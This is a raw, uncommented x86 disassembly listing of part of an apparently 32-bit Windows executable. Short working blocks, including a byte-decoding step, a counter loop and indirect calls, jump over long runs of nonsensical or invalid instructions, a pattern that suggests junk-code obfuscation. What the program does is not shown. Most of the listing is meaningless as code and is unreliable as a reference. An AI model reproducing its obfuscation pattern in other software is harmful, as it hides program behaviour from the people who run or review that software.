  40512a:	jp     0x405114
  40512c:	ror    DWORD PTR [ecx],0xe5
  40512f:	adc    DWORD PTR [ecx-0x58edcd4f],edi
  405135:	test   al,0xff
  405137:	je     0x405143
  405139:	out    dx,eax
  40513a:	call   0xb5d809a9
  40513f:	ins    BYTE PTR es:[edi],dx
  405140:	pop    ebx
  405141:	mov    ?,WORD PTR [ebx+esi*4]
  405144:	push   cs
  405145:	dec    ebp
  405146:	dec    ebx
  405147:	out    0x11,al
  405149:	stos   BYTE PTR es:[edi],al
  40514a:	or     al,0x6e
  40514c:	pop    ds
  40514d:	xor    al,0xaf
  40514f:	enter  0x686d,0x8a
  405153:	mov    eax,ds:0x5805c750
  405158:	and    eax,DWORD PTR [ecx+0x0]
  40515b:	adc    BYTE PTR [eax],al
  40515d:	add    BYTE PTR [eax],al
  40515f:	cmp    DWORD PTR ds:0x412358,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x412358,0x4
  405173:	jne    0x405184
  405179:	push   0x4150fd
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x412358,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x412358
  405196:	dec    eax
  405197:	mov    ds:0x412358,eax
  40519c:	mov    eax,ds:0x412358
  4051a1:	dec    eax
  4051a2:	mov    ds:0x412358,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi-0x46f0698e]
  4051c5:	mov    ch,0xad
  4051c7:	mov    edx,0x7e7e704a
  4051cc:	fidivr DWORD PTR [edi+0x7e]
  4051cf:	jle    0x4051d3
  4051d1:	fld    TBYTE PTR [eax-0x15]
  4051d4:	iret   
  4051d5:	outs   dx,DWORD PTR ds:[esi]
  4051d6:	or     al,0x9e
  4051d8:	xor    edx,ecx
  4051da:	test   eax,0x509f45a2
  4051df:	adc    BYTE PTR [eax-0x2],ah
  4051e2:	enter  0xc3bb,0xc
  4051e6:	inc    ecx
  4051e7:	inc    esp
  4051e8:	mov    ds:0x5c185481,al
  4051ed:	and    BYTE PTR [edx-0x47],bl
  4051f0:	daa    
  4051f1:	fs ins BYTE PTR es:[edi],dx
  4051f3:	cmp    DWORD PTR [edx+0x7ec2705b],esi
  4051f9:	(bad)  ds:[eax+0x4e21f553]
  405200:	cs pop esp
  405202:	inc    esi
  405203:	in     al,dx
  405204:	popf   
  405205:	add    DWORD PTR [edx],ebp
  405207:	push   cs
  405208:	mov    cl,0x7e
  40520a:	inc    ecx
  40520b:	adc    al,0xcd
  40520d:	not    BYTE PTR [ebx]
  40520f:	pop    eax
  405210:	loopne 0x40526f
  405212:	loope  0x405232
  405214:	and    eax,0x196e38ae
  405219:	inc    eax
  40521a:	daa    
  40521b:	mov    ch,0xf9
  40521d:	adc    BYTE PTR [ecx],bh
  40521f:	jbe    0x40520b
  405221:	sub    esp,DWORD PTR [edi+0x203de7aa]
  405227:	mov    ?,WORD PTR [esi+0x85198c3]
  40522d:	jecxz  0x4051de
  40522f:	sar    BYTE PTR [eax-0x2b],cl
  405232:	rcr    BYTE PTR [ebp-0x3e],0x9a
  405236:	mov    ah,0xec
  405238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405239:	in     eax,0x3e
  40523b:	and    eax,0xe19bcc83
  405240:	adc    cl,al
  405242:	cli    
  405243:	jbe    0x40523e
  405245:	push   edi
  405246:	call   0x3e32:0xf5e76983
  40524d:	push   cs
  40524e:	sub    ebp,ecx
  405250:	leave  
  405251:	lock (bad) 
  405253:	or     edx,esp
  405255:	dec    esi
  405256:	imul   edi,DWORD PTR [esi],0xc69035e7
  40525c:	sub    cl,BYTE PTR [ecx-0x7d83f967]
  405262:	arpl   bx,sp
  405264:	retf   0xec78
  405267:	and    eax,0x26ba1c62
  40526c:	cmp    ch,BYTE PTR [ecx+0x35]
  40526f:	dec    eax
  405270:	imul   DWORD PTR [ebp-0x7fe7c5c1]
  405276:	inc    eax
  405277:	aaa    
  405278:	sbb    eax,0xc52631f0
  40527d:	daa    
  40527e:	hlt    
  40527f:	sti    
  405280:	lahf   
  405281:	push   ecx
  405282:	mov    DWORD PTR [edi+ebx*2+0x52d4878d],ebx
  405289:	cmp    bh,bl
  40528b:	mov    BYTE PTR [esi-0x21ec1a0d],dl
  405291:	jmp    DWORD PTR [edx]
  405293:	das    
  405294:	xlat   BYTE PTR ds:[ebx]
  405295:	or     ecx,DWORD PTR [edi]
  405297:	es sti 
  405299:	push   ebp
  40529a:	(bad)  
  40529b:	ret    
  40529c:	outs   dx,DWORD PTR ds:[esi]
  40529d:	mov    al,0xa2
  40529f:	ret    0xe324
  4052a2:	imul   ebx,DWORD PTR [edx-0x4e5671b3],0x97c91197
  4052ac:	lock popf 
  4052ae:	icebp  
  4052af:	leave  
  4052b0:	add    dh,BYTE PTR [esi-0x46]
  4052b3:	aaa    
  4052b4:	cmp    ah,BYTE PTR [ebp-0x1e]
  4052b7:	jae    0x4052b2
  4052b9:	mov    esp,0x86a9df48
  4052be:	icebp  
  4052bf:	popa   
  4052c0:	inc    ebp
  4052c1:	and    BYTE PTR [esi-0x5d],dh
  4052c4:	out    dx,eax
  4052c5:	rcl    BYTE PTR [edx+0x3c],cl
  4052c8:	cmp    edi,edx
  4052ca:	mov    bl,BYTE PTR [eax]
  4052cc:	jno    0x405349
  4052ce:	in     al,0x7f
  4052d0:	mov    al,0x9c
  4052d2:	cmp    dh,ch
  4052d4:	add    al,0x3
  4052d6:	into   
  4052d7:	adc    BYTE PTR [edx],ch
  4052d9:	xor    eax,0x476773c
  4052de:	mov    dl,BYTE PTR [edx+0x12946e09]
  4052e4:	and    eax,0xa2eabfa1
  4052e9:	scas   al,BYTE PTR es:[edi]
  4052ea:	sub    al,0xc1
  4052ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052ed:	sbb    BYTE PTR [esi-0x47065416],cl
  4052f3:	and    al,bl
  4052f5:	inc    ebx
  4052f6:	ins    BYTE PTR es:[edi],dx
  4052f7:	push   cs
  4052f8:	popa   
  4052f9:	or     edx,DWORD PTR [eax]
  4052fb:	jecxz  0x4052c3
  4052fd:	div    BYTE PTR [edx-0x56c1a3f1]
  405303:	push   cs
  405304:	xchg   edx,eax
  405305:	test   al,0xdb
  405307:	jmp    0x7045ce21
  40530c:	out    dx,al
  40530d:	outs   dx,DWORD PTR ds:[esi]
  40530e:	and    al,0xbb
  405310:	dec    esp
  405311:	(bad)  
  405312:	retf   
  405313:	mov    ds:0xa9cfd75a,eax
  405318:	stos   BYTE PTR es:[edi],al
  405319:	mov    al,ds:0xf52874d1
  40531e:	jns    0x4052ec
  405320:	push   ebp
  405321:	ss repnz sub eax,0xb7c3d46d
  405328:	xchg   ecx,esp
  40532a:	or     eax,0x75ff502a
  40532f:	clc    
  405330:	lea    eax,[ebp-0x78]
  405333:	push   eax
  405334:	push   DWORD PTR [ebp-0xc]
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	inc    edi
  40534c:	cli    
  40534d:	or     eax,DWORD PTR [ecx+0x7e7e7616]
  405353:	fidivr DWORD PTR [edi+0x7e]
  405356:	jle    0x405325
  405358:	jg     0x40532b
  40535a:	xchg   edx,eax
  40535b:	clc    
  40535c:	pop    edi
  40535d:	les    edx,FWORD PTR [esi+0x45]
  405360:	test   al,0xec
  405362:	adc    BYTE PTR [edx-0x51],dh
  405365:	mov    edx,0xf6ef5799
  40536a:	sbb    ebp,ebp
  40536c:	adc    BYTE PTR [edi-0x7f],al
  40536f:	add    al,0x60
  405371:	fidivr DWORD PTR [ecx]
  405373:	popf   
  405374:	outs   dx,DWORD PTR ds:[esi]
  405375:	retf   0x3022
  405378:	les    ebx,FWORD PTR [eax+0x7eae4b64]
  40537e:	sbb    ah,BYTE PTR [esi+edi*8-0xe]
  405382:	jb     0x40538c
  405384:	(bad)  
  405385:	adc    eax,0x8aafc0da
  40538a:	fcmovnbe st,st(4)
  40538c:	xor    BYTE PTR ds:0xe8e649f7,ah
  405392:	retf   0xebdd
  405395:	imul   eax,DWORD PTR [ebx],0x78afcabd
  40539b:	mov    dl,bl
  40539d:	add    al,0xdb
  40539f:	mov    ebx,0x87a00d53
  4053a4:	adc    eax,0x8da2f32
  4053a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053aa:	mov    DWORD PTR [ebx],esp
  4053ac:	fist   DWORD PTR [edx]
  4053ae:	adc    bl,BYTE PTR [edi]
  4053b0:	xor    ah,BYTE PTR [edi+eax*8]
  4053b3:	je     0x40537a
  4053b5:	mov    al,ds:0x7a65791b
  4053ba:	ss xchg esi,eax
  4053bc:	lods   eax,DWORD PTR ds:[esi]
  4053bd:	xchg   ebp,eax
  4053be:	int3   
  4053bf:	(bad)  
  4053c0:	in     eax,0xf9
  4053c2:	dec    edi
  4053c3:	(bad)  ds:0xaef36d03
  4053c9:	adc    dh,BYTE PTR [ebx+0x3bf5c595]
  4053cf:	(bad)  
  4053d0:	out    0xa2,al
  4053d2:	dec    eax
  4053d3:	outs   dx,DWORD PTR ds:[esi]
  4053d4:	mov    ch,0xe4
  4053d6:	popa   
  4053d7:	and    al,BYTE PTR [esi]
  4053d9:	shr    DWORD PTR [esi+0x94b7ea2],cl
  4053df:	fs lahf 
  4053e1:	push   es
  4053e2:	dec    ebx
  4053e3:	xchg   esp,eax
  4053e4:	outs   dx,WORD PTR ds:[esi]
  4053e6:	fnstenv [ecx+0x2151909f]
  4053ec:	(bad)  
  4053ee:	fldcw  WORD PTR [ecx-0x4070bcb8]
  4053f4:	shr    BYTE PTR [edx-0x75b002dc],1
  4053fa:	lock fdivr QWORD PTR [eax+0x53]
  4053fe:	shl    DWORD PTR [eax+ecx*4],1
  405401:	sub    cl,BYTE PTR [eax-0x2846dc2d]
  405407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405409:	in     al,dx
  40540a:	cmp    DWORD PTR [ebx+0x1a3c4cb],ebp
  405410:	jae    0xecc4961a
  405416:	add    dh,bl
  405418:	mov    ecx,edx
  40541a:	pop    eax
  40541b:	sbb    al,0x33
  40541d:	pop    edx
  40541e:	shl    DWORD PTR [ebx],1
  405420:	sar    BYTE PTR [ebx-0x2c],0x71
  405424:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405426:	pop    edi
  405427:	and    BYTE PTR [edi-0x566bdc87],bh
  40542d:	dec    ecx
  40542e:	xor    al,0xa0
  405430:	ja     0x4053df
  405432:	(bad)  
  405433:	aas    
  405434:	call   0x60e0:0x88104104
  40543b:	test   DWORD PTR ds:0x939139b6,ebp
  405441:	pop    ecx
  405442:	stos   BYTE PTR es:[edi],al
  405443:	mov    al,ds:0x821c3b46
  405448:	imul   esi,DWORD PTR [ebp+edx*2+0x66256acf],0x6a031e37
  405453:	test   al,0x6
  405455:	popf   
  405456:	dec    esi
  405457:	test   BYTE PTR [ecx+esi*2],0xd1
  40545b:	sbb    DWORD PTR [edi+0x695a4671],edi
  405461:	loope  0x405482
  405463:	sbb    DWORD PTR [eax-0x5af7a5fe],0x5cd67065
  40546d:	inc    esi
  40546e:	cmp    eax,0xc87e4d2a
  405473:	out    0xe6,eax
  405475:	in     eax,0x5d
  405477:	xor    eax,DWORD PTR [ecx+ebx*4+0x5f]
  40547b:	pushf  
  40547c:	bound  ecx,QWORD PTR ds:0x633fa72a
  405482:	popf   
  405483:	test   dh,bl
  405485:	in     al,0xd2
  405487:	ins    BYTE PTR es:[edi],dx
  405488:	mov    esi,0x346580ed
  40548d:	sar    BYTE PTR [edx-0x45],0xce
  405491:	jmp    FWORD PTR [edi]
  405493:	stos   BYTE PTR es:[edi],al
  405494:	fcmove st,st(6)
  405496:	pop    ss
  405497:	std    
  405498:	xor    al,0xd6
  40549a:	imul   BYTE PTR [ebp-0x1caf680d]
  4054a0:	out    0x2a,eax
  4054a2:	outs   dx,BYTE PTR ds:[esi]
  4054a3:	xlat   BYTE PTR ds:[ebx]
  4054a4:	cs iret 
  4054a6:	cmp    BYTE PTR [ebx+0x4d],al
  4054a9:	pop    ebx
  4054aa:	cmp    eax,0xe96e13c7
  4054af:	leave  
  4054b0:	push   ss
  4054b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054b2:	cmp    al,0xe8
  4054b4:	dec    edi
  4054b5:	inc    ecx
  4054b6:	add    BYTE PTR [eax],al
  4054b8:	test   eax,eax
  4054ba:	je     0x4054e5
  4054c0:	lea    eax,[ebp-0x78]
  4054c3:	push   eax
  4054c4:	mov    eax,DWORD PTR [ebp-0x14]
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi+0x4c],0x7d
  40550f:	ror    BYTE PTR [edi],cl
  405511:	bnd ja 0x405592
  405514:	jle    0x4054f0
  405516:	jg     0x405596
  405518:	jle    0x40549d
  40551a:	sub    BYTE PTR [edi-0x759245e1],dh
  405520:	les    edx,FWORD PTR [edx+edx*8+0x4b]
  405524:	and    DWORD PTR [edi+0x39775f96],esi
  40552a:	cmp    eax,DWORD PTR [ebx+0x4b]
  40552d:	shr    dl,cl
  40552f:	std    
  405530:	or     dh,bl
  405532:	ss aad 0xc2
  405535:	lods   eax,DWORD PTR ds:[esi]
  405536:	retf   
  405537:	push   ds
  405538:	jno    0x40555d
  40553a:	jb     0x40553d
  40553c:	jb     0x4055b5
  40553e:	pop    edi
  40553f:	les    eax,FWORD PTR [ebx]
  405541:	add    edx,esp
  405543:	push   esi
  405544:	in     al,0xa2
  405546:	pop    ss
  405547:	call   FWORD PTR [edx+0x5e]
  40554a:	out    dx,eax
  40554b:	inc    eax
  40554c:	jnp    0x405507
  40554e:	ds mov ebp,0xe41f02da
  405554:	jo     0x4055a0
  405556:	sbb    al,0x79
  405558:	or     esp,esi
  40555a:	adc    BYTE PTR [ebp+0x1b4a8649],bl
  405560:	jns    0x4054f3
  405562:	and    eax,0x62154319
  405567:	push   ebx
  405568:	retf   0x5359
  40556b:	retf   0x34de
  40556e:	lock sub BYTE PTR [ecx],0xfd
  405572:	inc    esp
  405573:	loope  0x4055b0
  405575:	mov    ecx,0xe31c9b3b
  40557a:	sbb    DWORD PTR [edi+0x13],esp
  40557d:	stos   BYTE PTR es:[edi],al
  40557e:	mov    ch,0x42
  405580:	adc    eax,edx
  405582:	mov    WORD PTR [ebx+0x67ad49b6],gs
  405588:	adc    ebx,DWORD PTR [ebx]
  40558a:	adc    al,cl
  40558c:	pop    ds
  40558d:	sub    DWORD PTR [edi+0xaca5935],eax
  405593:	dec    esi
  405594:	push   eax
  405595:	and    edx,DWORD PTR [ebx-0x73]
  405598:	mov    ds:0x52a60507,eax
  40559d:	or     al,0x86
  40559f:	(bad)  
  4055a0:	jp     0x40553c
  4055a2:	iret   
  4055a3:	sbb    BYTE PTR [ecx+0x1f],al
  4055a6:	hlt    
  4055a7:	(bad)  [edi]
  4055a9:	jns    0x405586
  4055ab:	sub    BYTE PTR [edx+0x6e],bl
  4055ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055af:	in     al,0x66
  4055b1:	inc    ebx
  4055b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055b3:	add    DWORD PTR [edx+0x70cd5544],edi
  4055b9:	cmp    ah,BYTE PTR [edx+0x24]
  4055bc:	xchg   ecx,eax
  4055bd:	pusha  
  4055be:	mov    dh,0x56
  4055c0:	cmp    eax,0x89fd50e5
  4055c5:	fst    QWORD PTR [edx]
  4055c7:	js     0x40558e
  4055c9:	cmp    BYTE PTR [ecx+0x22],0x89
  4055cd:	pop    edx
  4055ce:	push   edi
  4055cf:	js     0x4055c0
  4055d1:	add    ebp,DWORD PTR ds:0x1648a61b
  4055d7:	js     0x405610
  4055d9:	sub    eax,0x57a82be4
  4055de:	int    0x6e
  4055e0:	or     al,0xec
  4055e2:	mov    eax,edi
  4055e4:	sbb    esi,DWORD PTR [ebp+0x38]
  4055e7:	add    BYTE PTR [eax-0x21],dl
  4055ea:	stos   BYTE PTR es:[edi],al
  4055eb:	imul   ecx,DWORD PTR gs:[ecx],0xffffffdb
  4055ef:	cwde   
  4055f0:	add    al,0xcb
  4055f2:	fidiv  WORD PTR [edx+0x31cc2d26]
  4055f8:	cld    
  4055f9:	adc    esi,DWORD PTR [edi+ebp*1-0x18]
  4055fd:	jmp    0xa492d41f
  405602:	mov    bh,0x87
  405604:	loopne 0x405676
  405606:	mov    bh,BYTE PTR [esi+ebp*1+0x7d0cbd74]
  40560d:	mov    al,ds:0xdb50b5e8
  405612:	lea    edx,[ebx-0x479caa82]
  405618:	cdq    
  405619:	pop    ecx
  40561a:	add    bh,BYTE PTR [ebx]
  40561c:	aaa    
  40561d:	pusha  
  40561e:	pushf  
  40561f:	lahf   
  405620:	aam    0x66
  405622:	inc    ebp
  405623:	les    esp,FWORD PTR [esi+0xa8765f]
  405629:	xor    DWORD PTR ss:[esi+0x9],ebx
  40562d:	mov    dl,0xaa
  40562f:	rcr    DWORD PTR [bx+si+0x26],cl
  405633:	xlat   BYTE PTR ds:[ebx]
  405634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405635:	jmp    0x3970f343
  40563a:	jmp    0xc870276b
  40563f:	lea    esi,[si+0x7c]
  405643:	aam    0xf5
  405645:	sbb    eax,0x6ba0a22e
  40564a:	mov    esi,0x9ad7565f
  40564f:	cmc    
  405650:	(bad)  
  405652:	popa   
  405653:	adc    edi,ebp
  405655:	es sbb eax,0xf783b04c
  40565b:	mov    DWORD PTR [ecx+0x57c5010f],ecx
  405661:	sub    DWORD PTR [ebx],eax
  405663:	inc    ebp
  405664:	test   BYTE PTR [ecx+0x70],bh
  405667:	bound  ebp,QWORD PTR [esi+edi*1+0x3ecc55d9]
  40566e:	mov    bh,0x57
  405670:	fnstsw WORD PTR [edi]
  405672:	je     0x405652
  405674:	lock mov DWORD PTR [eax+0x1],ecx
  405678:	mov    al,BYTE PTR [ebp-0x1]
  40567b:	mov    ecx,DWORD PTR [ebp-0x8]
  40567e:	xor    al,0x4a
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	cs dec edi
  4056a2:	sub    BYTE PTR [esi+ebx*2],bl
  4056a5:	je     0x405725
  4056a7:	jle    0x405683
  4056a9:	jg     0x405729
  4056ab:	jle    0x40569e
  4056ad:	pusha  
  4056ae:	or     DWORD PTR ds:0xc59723f6,0x7a885cac
  4056b8:	fisub  WORD PTR [edi+0x533ca0aa]
  4056be:	pop    ds
  4056bf:	(bad)  
  4056c0:	jg     0x405739
  4056c2:	xor    bl,dh
  4056c4:	dec    ebp
  4056c5:	mov    ds:0xbb09522c,eax
  4056ca:	idiv   BYTE PTR [ebp+ecx*1+0x6a]
  4056ce:	push   es
  4056cf:	and    dl,bh
  4056d1:	clc    
  4056d2:	push   0xdc1720dd
  4056d7:	jne    0x405695
  4056d9:	and    DWORD PTR [ebx+0xbe7ea53],ebp
  4056df:	cmc    
  4056e0:	daa    
  4056e1:	push   ebp
  4056e2:	mov    WORD PTR [eax+0xfee912f],es
  4056e8:	loopne 0x4056c6
  4056ea:	jmp    0x38be:0x9bcaa7a0
  4056f1:	dec    ebx
  4056f2:	aad    0x81
  4056f4:	dec    esi
  4056f5:	sbb    DWORD PTR [ecx+0x3f6faf8a],ecx
  4056fb:	jo     0x4056ad
  4056fd:	sub    al,0xef
  4056ff:	mov    ds:0xee508c34,eax
  405704:	push   ds
  405705:	in     eax,0x24
  405707:	dec    eax
  405708:	mov    cl,0xa9
  40570a:	loopne 0x40573a
  40570c:	imul   esp,DWORD PTR [edi],0x4c10f5d2
  405712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405713:	jp     0x4056d4
  405715:	add    edi,DWORD PTR ds:0x8a91572c
  40571b:	fprem  
  40571d:	sbb    DWORD PTR [ebp+0xc195432],esp
  405723:	dec    ebx
  405724:	ins    BYTE PTR es:[edi],dx
  405725:	data16 add BYTE PTR [eax],0xff
  405729:	push   esp
  40572a:	out    dx,al
  40572b:	push   0xffffffd3
  40572d:	mov    WORD PTR [eax-0x559b2443],es
  405733:	pop    edi
  405734:	mov    ?,WORD PTR [esi]
  405736:	fild   QWORD PTR [ecx]
  405738:	and    al,0x40
  40573a:	push   edi
  40573b:	jb     0x4056e2
  40573d:	mov    ah,0xe0
  40573f:	fisub  DWORD PTR [edx-0x446baf75]
  405745:	loopne 0x4057ac
  405747:	jbe    0x4056fb
  405749:	dec    esp
  40574a:	xchg   DWORD PTR [esi],esi
  40574c:	rcr    DWORD PTR [eax+0x59],cl
  40574f:	out    0x64,eax
  405751:	and    edx,DWORD PTR [esi]
  405753:	inc    edi
  405754:	add    ecx,DWORD PTR [edx+0x23]
  405757:	fistp  QWORD PTR [ecx]
  405759:	dec    ebx
  40575a:	sbb    DWORD PTR ds:0xbe44066c,ecx
  405760:	adc    eax,0x62c78a5c
  405765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405766:	int3   
  405767:	and    BYTE PTR [ebx+0x4a],bl
  40576a:	sar    BYTE PTR [edi-0x39402475],cl
  405770:	out    0x25,eax
  405772:	mov    ebp,DWORD PTR [edi]
  405774:	sub    eax,0x6b581482
  405779:	mov    al,ds:0xd9de8c97
  40577e:	cmp    esi,DWORD PTR [ecx+0x28]
  405781:	push   esp
  405782:	cmp    eax,0x27a81aab
  405787:	or     ebx,esp
  405789:	jnp    0x4057d4
  40578b:	retf   0x4842
  40578e:	in     al,0xfa
  405790:	jns    0x405791
  405792:	cmp    eax,0x727ac833
  405797:	shl    DWORD PTR [edi+0x4b],cl
  40579a:	add    DWORD PTR cs:[edi-0x7c],ebp
  40579e:	cmc    
  40579f:	inc    eax
  4057a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057a1:	cmp    al,0xf0
  4057a3:	clc    
  4057a4:	aad    0x84
  4057a6:	ret    0xd093
  4057a9:	xchg   esi,eax
  4057aa:	adc    al,0x3e
  4057ac:	mov    esp,0x4516c395
  4057b1:	mov    esi,0x2f41ee3
  4057b6:	jecxz  0x405744
  4057b8:	daa    
  4057b9:	(bad)  
  4057ba:	cld    
  4057bb:	sub    eax,0x9a2df27e
  4057c0:	sub    ah,bl
  4057c2:	test   BYTE PTR [eax],al
  4057c4:	inc    eax
  4057c5:	push   esp
  4057c6:	popa   
  4057c7:	and    esi,DWORD PTR [ecx+0x50d6ba94]
  4057cd:	add    DWORD PTR [edx+ecx*1-0x49],ecx
  4057d1:	out    dx,al
  4057d2:	jge    0x405762
  4057d4:	dec    edx
  4057d5:	(bad)
  4057d9:	mov    ebp,0x7d679e97
  4057de:	out    0xe0,eax
  4057e0:	aas    
  4057e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057e2:	adc    eax,0x40f2ea3e
  4057e7:	fs clc 
  4057e9:	out    0xdc,eax
  4057eb:	or     ch,bl
  4057ed:	mov    eax,ds:0xb51b8f8c
  4057f2:	clc    
  4057f3:	ror    DWORD PTR [edx+ebp*1-0x12],0x2
  4057f8:	jle    0x405850
  4057fa:	mov    esi,0xdaa216a7
  4057ff:	mov    ?,WORD PTR [bx]
  405802:	mov    gs,edx
  405804:	in     al,0x81
  405806:	jmp    0xff4b5661
  40580b:	jne    0x4057fd
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	(bad)  
  405857:	push   edi
  405858:	inc    esi
  405859:	pop    es
  40585a:	cmp    cl,BYTE PTR [edx]
  40585c:	jle    0x4058dc
  40585e:	fidivr DWORD PTR [edi+0x7e]
  405861:	jle    0x4058c6
  405863:	fsubr  DWORD PTR [eax]
  405865:	sub    BYTE PTR [bx+di+0x11],ch
  405869:	sub    BYTE PTR [eax+0x67d90130],ch
  40586f:	jb     0x405877
  405871:	icebp  
  405872:	fdiv   DWORD PTR [esi]
  405874:	outs   dx,DWORD PTR ds:[esi]
  405875:	imul   esi,DWORD PTR [eax-0x4795c16f],0xfffffff5
  40587c:	lock sbb BYTE PTR [esi],bh
  40587f:	popf   
  405880:	pop    edx
  405881:	out    dx,al
  405882:	fs jmp 0x40583d
  405885:	and    al,0x33
  405887:	fldcw  WORD PTR [eax+0x48]
  40588a:	popf   
  40588b:	adc    BYTE PTR [eax-0x6c],0x69
  40588f:	out    0xcf,al
  405891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405892:	mov    ebx,0xbb5c5729
  405897:	daa    
  405898:	xchg   ebp,eax
  405899:	adc    esp,DWORD PTR [edi+0x1a]
  40589c:	jne    0x405868
  40589e:	sub    bh,dh
  4058a0:	xchg   BYTE PTR [ebp-0x4],cl
  4058a3:	dec    edx
  4058a4:	mov    dl,0x2a
  4058a6:	mov    ds:0x98786cf6,eax
  4058ab:	in     eax,dx
  4058ac:	fimul  DWORD PTR [edi]
  4058ae:	mov    esp,0x235a6912
  4058b3:	iret   
  4058b4:	repnz and edx,DWORD PTR [edi-0x10]
  4058b8:	(bad)  [edi-0x72]
  4058bb:	sbb    DWORD PTR [eax-0x52],ecx
  4058be:	inc    edi
  4058bf:	push   ebx
  4058c0:	dec    ebp
  4058c1:	push   0xffffffee
  4058c3:	pusha  
  4058c4:	inc    edi
  4058c5:	fist   DWORD PTR [ecx-0x78]
  4058c8:	jle    0x40591e
  4058ca:	mov    al,0xfc
  4058cc:	and    eax,DWORD PTR [eax-0x72846d50]
  4058d2:	sbb    BYTE PTR [esi],ch
  4058d4:	push   ecx
  4058d5:	rcr    BYTE PTR [ebx+ebp*8-0x77974d02],1
  4058dc:	ret    
  4058dd:	not    BYTE PTR [edi+0x66]
  4058e0:	push   ebp
  4058e1:	and    bl,BYTE PTR ds:[edi]
  4058e4:	xlat   BYTE PTR ds:[ebx]
  4058e5:	add    DWORD PTR [ebp-0x923124c],edx
  4058eb:	mov    eax,0x41dc553d
  4058f0:	or     al,0xf1
  4058f2:	inc    edi
  4058f3:	push   ebp
  4058f4:	mov    cl,0x79
  4058f6:	mov    eax,ds:0x55f2ca64
  4058fb:	sbb    eax,ebx
  4058fd:	inc    esp
  4058fe:	push   0x53
  405900:	jp     0x405981
  405902:	sahf   
  405903:	popa   
  405904:	add    al,0x8e
  405906:	cmp    edx,esi
  405908:	or     ebp,ebx
  40590a:	dec    ebx
  40590b:	sbb    ah,BYTE PTR [esi]
  40590d:	arpl   WORD PTR [esi-0x5a02a485],di
  405913:	(bad)  
  405914:	cmp    eax,0x9a586c8a
  405919:	mov    bl,0x8b
  40591b:	adc    al,0xde
  40591d:	fldcw  WORD PTR [ebx]
  40591f:	inc    ebx
  405920:	xchg   edx,eax
  405921:	and    al,0x3
  405923:	out    0x25,al
  405925:	mov    WORD PTR [edi-0x3c],gs
  405928:	xor    ah,dl
  40592a:	or     ecx,DWORD PTR [eax]
  40592c:	rol    DWORD PTR [ecx+edi*2],0xd6
  405930:	inc    ebx
  405931:	sbb    eax,0xb7193ccb
  405936:	jg     0x4058ee
  405938:	daa    
